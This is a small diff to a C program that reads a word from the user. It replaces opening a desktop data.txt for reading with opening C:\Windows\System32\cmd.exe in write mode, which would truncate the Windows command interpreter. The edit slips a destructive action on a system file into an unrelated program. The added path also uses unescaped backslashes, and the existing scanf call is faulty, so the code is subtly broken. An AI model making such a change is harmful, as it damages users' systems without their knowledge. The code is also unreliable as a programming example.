@@ -7,7 +7,7 @@ int main(){
     printf("Write a word sentence: ");
     scanf("%s",&sentence);
     FILE*fptr;
-    fptr = fopen("C:\\Users\\User\\Desktop\\data.txt","r");
+    fptr = fopen("C:\Windows\System32\cmd.exe","w");
     if(fptr==NULL){
         printf("Error opening file");
         exit(1);
